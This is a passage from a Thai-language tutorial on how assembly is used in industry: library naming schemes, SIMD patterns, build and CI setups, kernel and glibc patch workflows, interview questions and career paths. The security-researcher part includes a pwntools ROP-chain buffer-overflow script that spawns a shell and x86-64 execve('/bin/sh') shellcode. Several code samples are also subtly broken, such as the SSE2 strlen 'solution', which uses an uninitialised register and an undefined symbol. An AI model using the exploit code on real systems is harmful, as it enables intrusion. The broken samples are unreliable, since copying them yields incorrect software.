    │   │    │   │   │   └── Process 8 blocks
    │   │    │   │   └────── Use AVX instructions
    │   │    │   └────────── 128-bit key
    │   │    └────────────── Encrypt
    │   └─────────────────── Counter mode
    └─────────────────────── AES algorithm
    
    sha256_ni_transform
    │      │   └── SHA-NI instructions
    │      └────── No intermediate buffer
    └───────────── SHA-256 algorithm
```

**glibc:**

```
__[name]_[isa]          (internal, double underscore)
__memcpy_avx_unaligned  → AVX version, no alignment required
__memcpy_avx512_erms    → AVX-512 + Enhanced REP MOVSB/STOSB
__strlen_sse2           → SSE2 version
__strcmp_avx2           → AVX2 version
```

**OpenSSL:**

```
[algo]_[operation]_[variant]_[arch]
aes_nohw_encrypt        → software AES (no hardware)
aesni_ecb_encrypt       → AES-NI, ECB mode
aes_gcm_enc_128_avx_gen4 → GCM, AES-128, 4th gen Intel AVX
```

**x264/x265:**

```
[codec]_[function]_[blocksize]_[isa]
x264_pixel_sad_4x4_mmx     → SAD for 4x4 block, MMX
x264_mc_copy_w16_avx       → motion copy, 16-wide, AVX
x264_predict_8x8_v_sse2    → intra prediction, SSE2
```

### 3.2 Common Patterns ในโค้ด Production

**Pattern 1: Function Dispatcher (IFUNC)**

```c
/* เลือก implementation ที่ดีที่สุดตอน startup */
void* memcpy(void *dst, const void *src, size_t n)
    __attribute__((ifunc("resolve_memcpy")));

static void* resolve_memcpy(void) {
    if (cpu_has_avx512())  return __memcpy_avx512;
    if (cpu_has_avx2())    return __memcpy_avx2;
    if (cpu_has_avx())     return __memcpy_avx;
    if (cpu_has_sse2())    return __memcpy_sse2;
    return __memcpy_generic;
}
```

**Pattern 2: Unrolled Loops**

```nasm
; แทน loop ที่มี overhead:
.loop:
    process_4_items
    sub rdx, 4
    jnz .loop

; ใช้ unrolled loop:
process_4_items    ; iteration 1
process_4_items    ; iteration 2
process_4_items    ; iteration 3
process_4_items    ; iteration 4
sub rdx, 16
jnz .loop
```

**Pattern 3: Duff's Device (Loop Unrolling สำหรับ tail)**

```c
/* ใน memcpy: จัดการ bytes สุดท้าย */
switch (n & 7) {
    case 7: *d++ = *s++;    /* FALLTHROUGH */
    case 6: *d++ = *s++;
    case 5: *d++ = *s++;
    case 4: *d++ = *s++;
    case 3: *d++ = *s++;
    case 2: *d++ = *s++;
    case 1: *d++ = *s++;
    case 0: break;
}
```

**Pattern 4: Prefetching**

```nasm
; Load data ล่วงหน้าเพื่อซ่อน memory latency
.loop:
    prefetchnta 512(%rsi)     ; Prefetch 512 bytes ahead, non-temporal
    vmovdqu     (%rsi), %ymm0
    vmovdqu     32(%rsi), %ymm1
    ; ... process data ...
    add         $64, %rsi
    sub         $64, %rdx
    jnz         .loop
```

**Pattern 5: SIMD Width Adaptation**

```nasm
; ตรวจสอบ size และเลือก SIMD width
cmp rdx, 64
jb  .use_xmm        ; < 64 bytes: use 16-byte XMM

cmp rdx, 128
jb  .use_ymm        ; < 128 bytes: use 32-byte YMM

; >= 128 bytes: use 64-byte ZMM (AVX-512)
.use_zmm:
    vmovdqu64 (%rsi), %zmm0
    ...
```

### 3.3 Build System Integration

**Linux Kernel Makefile:**

```makefile
# arch/x86/crypto/Makefile
# ============================================================
# Kconfig controls ว่า features ไหนจะ compile

obj-$(CONFIG_CRYPTO_AES_NI_INTEL)  += aesni-intel.o
aesni-intel-y := aesni-intel_asm.o aesni-intel_glue.o

obj-$(CONFIG_CRYPTO_SHA1_SSSE3)    += sha1-ssse3.o
sha1-ssse3-y := sha1_ssse3_asm.o sha1_ssse3_glue.o

# .S files ถูก compile ด้วย GAS (GNU Assembler)
# ผ่าน gcc -c -x assembler-with-cpp

# คำสั่ง kernel สำหรับ assembly:
# $(CC) $(a_flags) -c -o $@ $<
# โดย a_flags รวม:
#   -D__ASSEMBLY__
#   -DCONFIG_X86_64
#   ฯลฯ
```

**glibc Build System:**

```makefile
# glibc/sysdeps/x86_64/multiarch/Makefile

# IFUNC Implementations
sysdep_routines += memcpy-sse2-unaligned \
                   memcpy-avx-unaligned \
                   memcpy-avx512-unaligned \
                   memcpy-avx512-unaligned-erms \
                   strlen-sse2 strlen-avx2 \
                   strcmp-avx2 strcmp-sse42

# Each .S file → .o file
# IFUNC resolver links them all together
# Runtime: OS calls resolver once at startup
```

**OpenSSL Build System:**

```makefile
# openssl/Configurations/unix-Makefile.tmpl

# Generate assembly from Perl scripts
{- join("\n", map {
    my $obj = $_;
    $obj =~ s/\.s$/.o/;
    "$obj: $_.pl\n\t\$(PERL) \$< \$(PERLASM_SCHEME) \$@"
} @generated_asm) -}

# PERLASM_SCHEME values:
# elf          → Linux AT&T syntax
# macosx       → macOS Mach-O
# nasm         → Windows NASM Intel syntax
# masm         → Windows MASM Intel syntax
```

**x264 Build System:**

```makefile
# x264/Makefile

# NASM ใช้ compile .asm files
ASM = nasm
ASFLAGS = -f elf64 -DARCH_X86_64=1 -DHIGH_BIT_DEPTH=0

# CPU feature detection
ifeq ($(ARCH),X86_64)
    ASMS += common/x86/mc-a.asm \
            common/x86/dct-a.asm \
            common/x86/predict-a.asm \
            common/x86/pixel-a.asm
endif

%.o: %.asm
    $(ASM) $(ASFLAGS) -o $@ $<
```

### 3.4 CI Integration สำหรับ Assembly Code

**Linux Kernel CI (KernelCI):**

```yaml
# .github/workflows/kernel-build.yml (simplified)
name: Kernel Build Tests

on: [push, pull_request]

jobs:
  build-x86:
    runs-on: ubuntu-latest
    steps:
    - uses: actions/checkout@v3
    
    - name: Install cross-compilers
      run: sudo apt-get install -y gcc-x86-64-linux-gnu nasm
    
    - name: Configure kernel
      run: make x86_64_defconfig ARCH=x86_64
    
    - name: Build (ทดสอบว่า assembly compile ได้)
      run: make -j$(nproc) ARCH=x86_64 vmlinux
    
    - name: Run crypto self-tests
      # qemu-system-x86_64 runs kernel tests
      run: scripts/run_kcryptod_tests.sh
```

**glibc CI:**

```python
# glibc/scripts/test_cross.py (simplified)
# ทดสอบ assembly implementations ทุก ISA variant

ISA_VARIANTS = {
    'memcpy': [
        'sse2_unaligned',
        'avx_unaligned',
        'avx512_unaligned',
    ],
    'strlen': [
        'sse2',
        'avx2',
    ],
}

def test_ifunc_variant(name, variant):
    # Build with specific ISA flags
    # Run unit tests
    # Compare results with reference implementation
    pass
```

---

## ส่วนที่ 4: Contributing to Open Source ด้วย Assembly

### 4.1 กระบวนการ Contribute Assembly Patch

**ขั้นตอนสำหรับ Linux Kernel:**

```bash
# Step 1: ดู TODO list / open issues
git log --oneline arch/x86/crypto/ | head -20

# Step 2: เข้าใจโครงสร้าง
# อ่าน Documentation/crypto/
# อ่าน arch/x86/include/asm/

# Step 3: เขียน implementation
cat > arch/x86/crypto/sha256-avx512.S << 'EOF'
/* SHA-256 AVX-512 implementation */
#include <linux/linkage.h>
SYM_FUNC_START(sha256_transform_avx512)
    /* ... */
SYM_FUNC_END(sha256_transform_avx512)
EOF

# Step 4: Integration test
make ARCH=x86_64 arch/x86/crypto/sha256_ni_glue.o

# Step 5: สร้าง test
cat > crypto/testmgr.h << 'EOF'
/* Add test vectors for new implementation */
EOF

# Step 6: ทดสอบด้วย CONFIG_CRYPTO_MANAGER_EXTRA_TESTS=y
make ARCH=x86_64 menuconfig
# เปิด: Cryptographic API → Crypto Tests

make ARCH=x86_64 -j$(nproc) && qemu-system-x86_64 ...

# Step 7: Performance benchmark
openssl speed sha256  # ก่อน
# Apply patch
openssl speed sha256  # หลัง

# Step 8: สร้าง patch
git format-patch -1 --subject-prefix="PATCH v1"

# Step 9: Check patch format
scripts/checkpatch.pl 0001-crypto-*.patch

# Step 10: ส่ง patch
git send-email --to=linux-crypto@vger.kernel.org \
               --cc=herbert@gondor.apana.org.au \
               0001-crypto-*.patch
```

**ตัวอย่าง Patch Email:**

```
From: Your Name <your@email.com>
To: linux-crypto@vger.kernel.org
Subject: [PATCH v1] crypto: sha256 - Add AVX-512 optimized implementation

Add AVX-512 optimized SHA-256 transform that processes 2 message
blocks simultaneously using AVX-512 registers.

Performance improvement on Intel Ice Lake:
- Before: 1.23 cycles/byte
- After:  0.71 cycles/byte (42% improvement)

Tested with:
- CONFIG_CRYPTO_MANAGER_EXTRA_TESTS=y
- tcrypt.ko mode=304 (SHA-256 speed test)

Signed-off-by: Your Name <your@email.com>
---
 arch/x86/crypto/Makefile               |   3 +
 arch/x86/crypto/sha256-avx512.S        | 450 +++++++++++++++++++++++
 arch/x86/crypto/sha256_ni_glue.c       |  47 ++-
 3 files changed, 498 insertions(+), 2 deletions(-)
```

### 4.2 Testing Assembly Patches

**Unit Testing สำหรับ Crypto:**

```c
/* crypto/testmgr.c */
static const struct hash_testvec sha256_tv_template[] = {
    {
        .plaintext = "",
        .psize = 0,
        .digest = "\xe3\xb0\xc4\x42\x98\xfc\x1c\x14"
                  "\x9a\xfb\xf4\xc8\x99\x6f\xb9\x24"
                  "\x27\xae\x41\xe4\x64\x9b\x93\x4c"
                  "\xa4\x95\x99\x1b\x78\x52\xb8\x55",
    },
    /* ... more test vectors ... */
};

/* สำหรับ AVX-512 implementation:
 * ต้องผ่าน test vectors เดียวกันทุกตัว
 * Kernel จะ test ทุก implementation ถ้าเปิด EXTRA_TESTS
 */
```

**Benchmarking อย่างถูกต้อง:**

```c
/* ปัญหาทั่วไปใน Assembly benchmarking */

// BAD: CPU frequency scaling ทำให้ผลไม่ stable
for (int i = 0; i < 1000; i++) {
    gettimeofday(&start, NULL);
    sha256_transform(data, len);
    gettimeofday(&end, NULL);
}

// GOOD: ใช้ CPU cycles โดยตรง + pin to core
#include <sched.h>
cpu_set_t cpuset;
CPU_SET(0, &cpuset);
sched_setaffinity(0, sizeof(cpuset), &cpuset);

// Disable turbo boost before testing:
// echo 1 > /sys/devices/system/cpu/intel_pstate/no_turbo

uint64_t start = rdtsc();
for (int i = 0; i < 10000; i++) {
    sha256_transform(data, len);
}
uint64_t end = rdtsc();
printf("%.2f cycles/byte\n", 
       (double)(end - start) / (10000 * len));
```

**Differential Testing:**

```python
#!/usr/bin/env python3
# test_asm_vs_c.py - ทดสอบว่า assembly ตรงกับ C reference

import subprocess
import random
import hashlib

def generate_random_data(size):
    return bytes(random.randint(0, 255) for _ in range(size))

def test_sha256(data):
    # Reference: Python hashlib (uses OpenSSL)
    ref = hashlib.sha256(data).digest()
    
    # Our implementation (write to stdin, read from stdout)
    result = subprocess.run(
        ['./sha256_test'],
        input=data,
        capture_output=True
    )
    our = bytes.fromhex(result.stdout.strip().decode())
    
    if ref != our:
        print(f"MISMATCH for {len(data)} bytes!")
        print(f"Expected: {ref.hex()}")
        print(f"Got:      {our.hex()}")
        return False
    return True

# Test edge cases
for size in [0, 1, 55, 56, 64, 119, 120, 128, 1024, 65536]:
    data = generate_random_data(size)
    assert test_sha256(data), f"Failed for size {size}"
    print(f"OK: {size} bytes")
```

### 4.3 Contributing to glibc

```bash
# glibc ใช้ GNU Savannah สำหรับ bug tracking
# Patches ส่งทาง libc-alpha@sourceware.org

# Step 1: สร้าง new string function implementation
vim sysdeps/x86_64/multiarch/my_new_strlen.S

# Step 2: Register ใน IFUNC resolver
vim sysdeps/x86_64/multiarch/ifunc-strlen.h

# Step 3: เพิ่มใน Makefile
vim sysdeps/x86_64/multiarch/Makefile

# Step 4: ทดสอบ
cd build/
make check TESTS=string/test-strlen

# Step 5: ส่ง patch
git format-patch origin/master
# ส่ง email ไป libc-alpha@sourceware.org
```

### 4.4 Contributing to x264

```bash
# x264 ใช้ mailing list: x264-devel@videolan.org
# หรือ merge requests บน code.videolan.org

# ทดสอบ encoding quality หลัง assembly changes:
x264 --preset medium --crf 23 -o test.mkv input.y4m

# ตรวจสอบ PSNR/SSIM ไม่เปลี่ยน:
ffmpeg -i test.mkv -i reference.mkv -lavfi psnr -f null -

# Benchmark encoding speed:
x264 --preset medium --fps 25 --frames 1000 \
     --no-progress -o /dev/null input.y4m
```

---

## ส่วนที่ 5: Assembly ใน Job Interviews

### 5.1 Common Interview Questions

**ระดับ Entry/Mid-Level:**

```
Q1: อธิบาย calling convention ของ x86-64 Linux
A: System V AMD64 ABI:
   - Arguments: rdi, rsi, rdx, rcx, r8, r9 (registers)
   - Additional args: stack (right-to-left)
   - Return value: rax (rdx สำหรับ 128-bit)
   - Caller-saved: rax, rcx, rdx, rsi, rdi, r8-r11
   - Callee-saved: rbx, rbp, r12-r15
   - Red zone: 128 bytes below rsp (leaf functions)

Q2: อะไรคือความแตกต่างระหว่าง MOV และ LEA?
A: MOV โหลดข้อมูลจาก memory address
   LEA คำนวณ address แต่ไม่ access memory
   
   MOV rax, [rbx + rcx*4 + 8]  → โหลด value จาก address
   LEA rax, [rbx + rcx*4 + 8]  → คำนวณ address ใส่ rax
   
   LEA ใช้สำหรับ: arithmetic, address computation,
   multiply by 3/5/9 (LEA rax, [rbx + rbx*2])

Q3: อธิบาย cache hierarchy และ impact ต่อ assembly
A: L1 cache: 32-64KB, ~4 cycles latency
   L2 cache: 256KB-1MB, ~12 cycles
   L3 cache: 4-64MB, ~40 cycles  
   RAM: GBs, ~200 cycles
   
   ผลต่อการเขียน assembly:
   - Sequential access > random access
   - Prefetch instructions: PREFETCHT0, PREFETCHNTA
   - Non-temporal stores: MOVNTQ, VMOVNTDQ (bypass cache)
   - Cache line = 64 bytes: align critical data
```

**ระดับ Senior/Staff:**

```
Q4: อธิบาย CPU out-of-order execution และ implications
A: Modern CPUs ไม่ execute instructions ตาม program order
   
   Out-of-order execution:
   1. Instruction fetch & decode
   2. Rename registers (แก้ WAR, WAW hazards)
   3. Issue ตาม data availability (ROB)
   4. Execute (parallel execution units)
   5. Commit ตาม program order
   
   Implications สำหรับ Assembly:
   - Pipeline stalls จาก data dependencies
   - Memory ordering (MFENCE, LFENCE, SFENCE)
   - Store-to-load forwarding
   - Branch prediction + speculative execution
   - Spectre: ใช้ execution path ที่ไม่ควร execute

Q5: อธิบาย SIMD vectorization และ auto-vectorization
A: SIMD = Single Instruction, Multiple Data
   
   SSE2: 128-bit = 2×f64 หรือ 4×f32 หรือ 16×i8
   AVX2: 256-bit = 4×f64 หรือ 8×f32 หรือ 32×i8
   AVX-512: 512-bit = 8×f64 หรือ 16×f32 หรือ 64×i8
   
   Auto-vectorization: compiler เปลี่ยน loop เป็น SIMD
   ต้องการ: no aliasing, simple loop structure, alignment
   
   Manual vectorization: เขียน intrinsics หรือ assembly
   ใช้เมื่อ: compiler ล้มเหลว, ต้องการ specific instructions,
             control over register allocation

Q6: Describe a scenario where you'd use non-temporal stores
A: Non-temporal (NT) stores: MOVNTQ, VMOVNTDQ
   
   ข้ามการ load cache line ก่อน write (write-combining)
   
   ใช้เมื่อ:
   1. Data ที่เขียนแล้วไม่ได้อ่านทันที (streaming write)
   2. Data ใหญ่กว่า L3 cache
   3. Destination ที่ไม่ต้องการ cache
   
   ตัวอย่าง: memset ขนาดใหญ่, video frame clear,
             DMA buffer fill
   
   ข้อควรระวัง:
   - ต้องการ SFENCE ก่อน read จาก CPU อื่น
   - ช้ากว่า regular stores สำหรับ small data
   - ไม่เหมาะกับ temporal data
```

**ระดับ Principal/Architect:**

```
Q7: Design an optimized string search using SIMD
A: ใช้ PCMPESTRM (SSE4.2) หรือ manual SIMD

   Approach:
   1. Load 16/32 bytes จาก haystack ด้วย MOVDQU/VMOVDQU
   2. Broadcast needle character ด้วย VPBROADCASTB
   3. Compare: VPCMPEQB (bitwise equality all 16/32 bytes)
   4. Find first match: VPMOVMSKB + BSF (bit scan forward)
   
   ตัวอย่าง implementation:
   
   ; Find byte 'c' in 16-byte chunk
   movdqu  xmm0, [haystack]      ; Load 16 bytes
   movd    xmm1, ecx             ; Load needle char
   pshufb  xmm1, xmm2            ; Broadcast to all 16 positions
   pcmpeqb xmm0, xmm1            ; Compare all 16 positions
   pmovmskb eax, xmm0            ; Get bitmask of matches
   bsf     eax, eax              ; Find first set bit (first match)
   jz      .no_match             ; No match in this chunk

Q8: How would you implement lock-free data structure in assembly?
A: Lock-free ต้องการ atomic operations:

   CMPXCHG (Compare and Exchange):
   ; CAS: atomically: if (*ptr == expected) { *ptr = newval }
   mov   rax, [expected]
   lock cmpxchg [ptr], newval    ; rax = old value
   jne   .retry                  ; หาก ไม่ตรง retry
   
   CMPXCHG16B (128-bit CAS สำหรับ ABA problem):
   lock cmpxchg16b [ptr]         ; rdx:rax = old, rcx:rbx = new
   
   XADD (Exchange and Add):
   lock xadd [counter], rax      ; atomic increment, return old
   
   Memory barriers:
   mfence   ; Full memory barrier (load + store)
   lfence   ; Load fence
   sfence   ; Store fence
   
   ABA problem solution: ใช้ version counter
   struct { pointer ptr; uint64_t version; } cas_pair;
   ; ใช้ CMPXCHG16B เพื่อ compare ทั้ง pointer + version
```

### 5.2 Expected Knowledge ในแต่ละ Role

**Junior Assembly Developer:**
```
✓ ความเข้าใจ register set x86-64
✓ Basic instructions: MOV, ADD, SUB, CMP, JMP
✓ Calling conventions
✓ Stack frame structure
✓ SIMD basics (SSE2)
✓ สามารถอ่าน disassembly ได้
```

**Mid-Level Assembly Developer:**
```
✓ ทุกอย่างใน Junior
✓ SIMD advanced (AVX, AVX2)
✓ Cache optimization techniques
✓ Branch prediction optimization
✓ Profiling tools (perf, VTune)
✓ Inline assembly ใน C/C++
✓ Understanding compiler output
```

**Senior Assembly Developer:**
```
✓ ทุกอย่างใน Mid-Level
✓ AVX-512
✓ Microarchitecture knowledge (uops, ports, latencies)
✓ Memory subsystem (cache coherence, NUMA)
✓ Lock-free programming
✓ Spectre/Meltdown mitigations
✓ Multiple architectures (ARM64, RISC-V)
✓ Compiler backend understanding
```

**Staff/Principal Assembly Developer:**
```
✓ ทุกอย่างใน Senior
✓ CPU microarchitecture internals
✓ LLVM/GCC backend development
✓ Performance modeling
✓ New instruction set design
✓ Cross-architecture optimization
✓ Mentoring และ architecture decisions
```

### 5.3 Interview Code Challenge Examples

**Challenge 1: Implement strlen ด้วย SIMD**

```nasm
; Task: implement strlen(const char* s) ด้วย SSE2
; กฎ: ต้องเร็วกว่า naive byte-by-byte scan

; Solution approach:
; 1. Process 16 bytes per iteration
; 2. ใช้ PCMPEQB เปรียบเทียบกับ zero
; 3. PMOVMSKB แปลงเป็น bitmask
; 4. BSF หา position ของ null terminator

section .text
global fast_strlen

fast_strlen:
    ; rdi = string pointer
    mov     rax, rdi
    
    ; Align to 16-byte boundary
    and     rdi, -16        ; Floor to 16-byte boundary
    
    ; Create null byte mask
    pxor    xmm0, xmm0
    
    ; ตรวจสอบ bytes ก่อน alignment
    mov     rcx, rax
    and     rcx, 15         ; offset within 16-byte block
    
    ; Load first 16 bytes
    pcmpeqb xmm1, [rdi]     ; Compare with zero (xmm0)
    pmovmskb edx, xmm1      ; Bitmask: bit=1 if null found
    
    ; Mask out bytes before string start
    ; (ถ้า string ไม่ start ที่ boundary)
    shr     edx, cl         ; Shift out pre-string bytes
    test    edx, edx
    jnz     .found_null
    
.loop:
    add     rdi, 16
    movdqa  xmm1, [rdi]
    pcmpeqb xmm1, xmm0
    pmovmskb edx, xmm1
    test    edx, edx
    jz      .loop
    
.found_null:
    bsf     ecx, edx        ; Find first null position
    lea     rax, [rdi + rcx]
    sub     rax, rax_original ; Length = null_pos - start
    ret
```

**Challenge 2: Optimize Matrix Multiply Inner Loop**

```nasm
; 4x4 float matrix multiply (innermost loop)
; C[i][j] += A[i][k] * B[k][j]

; AVX implementation: process 8 floats simultaneously
vmovups     ymm0, [B + k*16]      ; Load B[k][j..j+7]
vbroadcastss ymm1, [A + i*16 + k*4] ; Broadcast A[i][k]
vmulps      ymm2, ymm0, ymm1      ; A[i][k] * B[k][j..j+7]
vaddps      ymm3, ymm3, ymm2      ; Accumulate to C[i][j..j+7]
```

---

## ส่วนที่ 6: Career Paths ที่ใช้ Assembly

### 6.1 Compiler Engineer

**ความรับผิดชอบ:**
- พัฒนา backend ของ LLVM หรือ GCC
- Implement code generation สำหรับ architectures ใหม่
- Optimize instruction selection, register allocation
- Develop vectorization passes

**ทักษะที่ต้องการ:**
```
Technical:
✓ Deep assembly knowledge (multiple ISAs)
✓ Compiler theory (SSA, data flow analysis)
✓ LLVM IR หรือ GCC RTL
✓ Performance analysis tools

Tools:
✓ LLVM/Clang source code
✓ GCC source code
✓ Godbolt Compiler Explorer
✓ llvm-mca (LLVM Machine Code Analyzer)
```

**ตัวอย่าง งาน Compiler Engineer:**

```cpp
// LLVM Backend: Implement new instruction pattern
// Target: optimize x = a * 5 เป็น LEA
// llvm/lib/Target/X86/X86ISelLowering.cpp

SDValue X86TargetLowering::LowerMUL(SDValue Op, SelectionDAG &DAG) const {
    SDLoc DL(Op);
    MVT VT = Op.getSimpleValueType();
    
    SDValue A = Op.getOperand(0);
    SDValue B = Op.getOperand(1);
    
    // Check if B is constant 5
    if (auto *C = dyn_cast<ConstantSDNode>(B)) {
        if (C->getZExtValue() == 5) {
            // a * 5 = a + a*4 = LEA rax, [rax + rax*4]
            SDValue Scaled = DAG.getNode(ISD::SHL, DL, VT, A,
                                         DAG.getConstant(2, DL, MVT::i8));
            return DAG.getNode(ISD::ADD, DL, VT, A, Scaled);
        }
    }
    
    return SDValue(); // Use default multiply
}
```

**Career Progression:**
```
Junior Compiler Engineer (0-3 years)
    ↓ Implement specific optimizations
Mid-Level Compiler Engineer (3-7 years)  
    ↓ Own optimization passes
Senior Compiler Engineer (7+ years)
    ↓ Architecture decisions
Principal Compiler Engineer
    ↓ Cross-team impact
Compiler Architect
```

**บริษัทที่จ้าง:**
- Google (LLVM, V8, XLA)
- Apple (Clang, Swift Compiler)
- Intel (oneAPI DPC++)
- ARM (Compiler team)
- Qualcomm (LLVM for Hexagon)
- AMD (ROCm compiler)
- NVIDIA (nvcc, PTX)

### 6.2 Embedded Systems Engineer

**ความรับผิดชอบ:**
- เขียน firmware สำหรับ microcontrollers
- Optimize code size และ performance บน constrained hardware
- Implement boot sequences, interrupt handlers
- Hardware bring-up

**ทักษะที่ต้องการ:**
```
Technical:
✓ ARM Thumb/Thumb-2 assembly
✓ RISC-V assembly
✓ Memory-mapped I/O
✓ Interrupt handling
✓ Linker scripts
✓ RTOS internals

Hardware Knowledge:
✓ Oscilloscope/Logic analyzer
✓ JTAG debugging
✓ Hardware protocols (SPI, I2C, UART, CAN)
```

**ตัวอย่าง: ARM Cortex-M Interrupt Handler:**

```asm
/* ARM Thumb-2 Assembly */
/* HardFault handler - Debug crash ใน embedded system */

.syntax unified
.thumb
.text

.global HardFault_Handler
.type   HardFault_Handler, %function

HardFault_Handler:
    /* ตรวจสอบว่า came from Thread mode หรือ Handler mode */
    tst     lr, #4              ; Test bit 2 of EXC_RETURN
    ite     eq                   ; IF-THEN-ELSE
    mrseq   r0, msp             ; IF equal: Main Stack Pointer
    mrsne   r0, psp             ; ELSE: Process Stack Pointer
    
    /* r0 = stack frame pointer */
    /* Stack frame layout (pushed by hardware):
     * r0, r1, r2, r3, r12, lr, pc, xpsr
     */
    
    /* Extract faulting PC */
    ldr     r1, [r0, #24]       ; PC is at offset 24
    
    /* Extract fault address (bus fault, mem fault) */
    ldr     r2, =0xE000ED34     ; BFAR (Bus Fault Address Register)
    ldr     r2, [r2]
    ldr     r3, =0xE000ED38     ; MMFAR (MemManage Fault Address Register)
    ldr     r3, [r3]
    
    /* Call C handler with fault info */
    bl      hard_fault_handler_c
    
    /* Should not return - but if it does, loop forever */
.loop:
    b       .loop

.size HardFault_Handler, . - HardFault_Handler
```

**Career Progression:**
```
Embedded Software Engineer (entry)
    ↓
Senior Embedded Engineer
    ↓
Lead Embedded Engineer / System Architect
    ↓
Principal Embedded Architect
```

**Salary Range (US):** $80K - $200K+

### 6.3 Security Researcher

**ความรับผิดชอบ:**
- Reverse engineering binaries
- Exploit development
- Vulnerability research
- Malware analysis
- Firmware security analysis

**ทักษะที่ต้องการ:**
```
Technical:
✓ Deep x86/ARM assembly reading
✓ Reverse engineering tools (IDA Pro, Ghidra, Binary Ninja)
✓ Debugging (GDB, WinDbg, LLDB)
✓ Memory exploitation techniques
✓ ROP/JOP chain building
✓ Heap internals

Security Knowledge:
✓ Buffer overflows, format strings, UAF
✓ ASLR, DEP/NX, Stack Canaries, CFI
✓ Kernel exploitation
✓ Browser exploitation
✓ Embedded/IoT security
```

**ตัวอย่าง: ROP Gadget Analysis:**

```python
#!/usr/bin/env python3
# ค้นหา ROP gadgets ใน binary

from pwn import *

# Load binary
elf = ELF('/bin/ls')

# Find useful gadgets
# "pop rdi; ret" — สำหรับ set first argument
gadgets = ROP(elf)
pop_rdi = gadgets.find_gadget(['pop rdi', 'ret'])

print(f"pop rdi; ret @ {hex(pop_rdi.address)}")

# สร้าง ROP chain
chain = [
    pop_rdi.address,
    next(elf.search(b'/bin/sh\x00')),  # "/bin/sh" address
    elf.plt['system'],                  # system() address
]

payload = b'A' * 72    # Buffer overflow offset
payload += pack(chain)  # ROP chain

# Execute
p = process('/vulnerable_binary')
p.send(payload)
p.interactive()
```

**Assembly ใน Exploit Development:**

```nasm
; Shellcode สำหรับ x86-64 Linux
; execve("/bin/sh", ["/bin/sh", NULL], NULL)
; เขียนด้วย Assembly เพื่อควบคุม bytes ทุกตัว

bits 64

section .text
global _start

_start:
    ; Zero rdx (envp = NULL)
    xor     rdx, rdx
    
    ; Push "/bin/sh\0" onto stack
    ; trick: ใช้ RIP-relative addressing
    lea     rdi, [rel sh_string]
    
    ; argv = ["/bin/sh", NULL]
    lea     rsi, [rel argv]
    
    ; execve syscall = 59
    mov     al, 59
    syscall
    
sh_string:
    db '/bin/sh', 0

argv:
    dq sh_string    ; argv[0] = "/bin/sh"
    dq 0            ; argv[1] = NULL
```

**Career Progression:**
```
Security Analyst → Penetration Tester → Security Researcher
→ Vulnerability Researcher → Principal Security Researcher
→ Distinguished Security Researcher
```

### 6.4 Game Engine Developer

**ความรับผิดชอบ:**
- Optimize rendering pipelines
- Implement physics simulation
- Audio DSP
- Collision detection
- Animation blending

**Assembly ใน Game Engines:**

```cpp
// Unreal Engine: SIMD Quaternion multiplication
// UE4/Source/Runtime/Core/Public/Math/VectorRegister.h

FORCEINLINE VectorRegister VectorQuaternionMultiply(
    const VectorRegister& Quat1, const VectorRegister& Quat2)
{
#if PLATFORM_ENABLE_VECTORINTRINSICS
    // q1 = (w1, x1, y1, z1), q2 = (w2, x2, y2, z2)
    // result.w = w1*w2 - x1*x2 - y1*y2 - z1*z2
    // result.x = w1*x2 + x1*w2 + y1*z2 - z1*y2
    // etc.
    
    VectorRegister R = VectorMulAdd(
        VectorSwizzle(Quat1, 3,3,3,3), Quat2,
        VectorZero()
    );
    
    // ... complex SIMD operations ...
    
    return R;
#else
    // Scalar fallback
    return FQuat(
        Quat1.W*Quat2.X + Quat1.X*Quat2.W + 
        Quat1.Y*Quat2.Z - Quat1.Z*Quat2.Y,
        // ...
    );
#endif
}
```

**SIMD สำหรับ Physics (PhysX/Havok):**

```nasm
; AAB (Axis-Aligned Bounding Box) intersection test
; ทดสอบ 4 box pairs พร้อมกัน

; xmm0 = minA.x of 4 boxes
; xmm1 = maxA.x of 4 boxes
; xmm2 = minB.x of 4 boxes
; xmm3 = maxB.x of 4 boxes

; Test: maxA >= minB AND maxB >= minA (per axis)
movaps  xmm4, xmm1          ; maxA.x
cmpps   xmm4, xmm2, 5       ; maxA >= minB? (NLT comparison)
movaps  xmm5, xmm3          ; maxB.x
cmpps   xmm5, xmm0, 5       ; maxB >= minA?
andps   xmm4, xmm5          ; Both conditions must be true

; Repeat for Y and Z axes...
; Final result: bitmask of 4 intersecting pairs
movmskps eax, xmm4
```

### 6.5 HPC Engineer (High Performance Computing)

**ความรับผิดชอบ:**
- Optimize scientific computing codes
- Implement numerical algorithms (BLAS, LAPACK)
- Vectorize simulation codes
- GPU/CPU co-optimization

**ตัวอย่าง: DGEMM (Dense Matrix Multiply)**

```nasm
; Double precision General Matrix Multiply
; C = alpha * A * B + beta * C
; 
; Intel MKL, OpenBLAS ใช้ assembly เต็มรูปแบบ

; Kernel 8x4 (8 rows of C, 4 columns ต่อ iteration)
; ใช้ AVX (256-bit = 4 doubles per register)

; Registers:
; ymm0-ymm7:  C matrix accumulators (8 rows × 1 column)
; ymm8:       A column (4 doubles, broadcast 1 at a time)
; ymm9-ymm12: B rows

; Initialize C accumulators to 0
vxorpd  ymm0, ymm0, ymm0
vxorpd  ymm1, ymm1, ymm1
; ...

.k_loop:
    ; Load 4 elements from A column
    vmovupd ymm8, [A]
    
    ; Load B[k][0..3] (4 doubles)
    vbroadcastsd ymm9, [B]       ; B[k][0]
    vbroadcastsd ymm10, [B+8]    ; B[k][1]
    vbroadcastsd ymm11, [B+16]   ; B[k][2]
    vbroadcastsd ymm12, [B+24]   ; B[k][3]
    
    ; Outer product: 4×4 matrix
    vfmadd231pd ymm0, ymm8, ymm9  ; row 0: A * B[k][0]
    vfmadd231pd ymm1, ymm8, ymm10 ; row 0: A * B[k][1]
    ; ...
    
    add A, 32    ; Next 4 elements of A column
    add B, 32    ; Next row of B
    dec k
    jnz .k_loop

; Store C (with alpha/beta scaling)
; ...
```

---

## ส่วนที่ 7: Industry Tools

### 7.1 Compiler RT (LLVM Compiler Runtime)

**Compiler RT คืออะไร?**

Compiler RT เป็น runtime library ของ LLVM ที่ provide:
- Low-level arithmetic (64-bit division บน 32-bit systems)
- Sanitizer runtimes (AddressSanitizer, UBSan, etc.)
- Profile-guided optimization support
- Atomic operations

**Assembly ใน Compiler RT:**

```asm
# compiler-rt/lib/builtins/x86_64/floatundidf.S
# Convert unsigned 64-bit integer to double

.text
.align 4, 0x90
.globl __floatundidf

# uint64_t → double conversion
# ปัญหา: x87 FPU ไม่มี unsigned 64-bit to float
# ต้อง implement manually

__floatundidf:
    push    %rbp
    mov     %rsp, %rbp
    
